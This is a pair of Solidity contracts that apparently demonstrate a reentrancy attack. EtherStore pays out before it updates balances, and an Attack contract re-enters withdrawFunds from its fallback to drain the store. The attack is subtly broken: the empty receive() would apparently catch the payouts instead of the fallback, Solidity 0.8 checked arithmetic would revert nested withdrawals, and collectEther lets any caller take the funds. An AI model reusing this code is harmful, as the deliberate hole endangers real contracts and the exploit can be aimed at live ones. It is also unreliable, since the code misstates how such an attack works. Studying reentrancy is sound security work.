// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./EtherStore.sol";


contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 0.01 ether);
        etherStore.depositFunds{value: 0.01 ether}();
        etherStore.withdrawFunds(0.01 ether);
    }

    function collectEther() public payable {
        address payable owner = payable(msg.sender);
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(etherStore).balance > 0.01 ether) {
            etherStore.withdrawFunds(0.01 ether);
        }
    }

    receive() external payable {

    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract EtherStore {

    uint256 withdrawalLimit = 0.01 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        require(_weiToWithdraw <= withdrawalLimit);
        require(block.timestamp >= lastWithdrawTime[msg.sender]);
        (bool success, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(success, "failed to send ether");
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = block.timestamp;
    }

}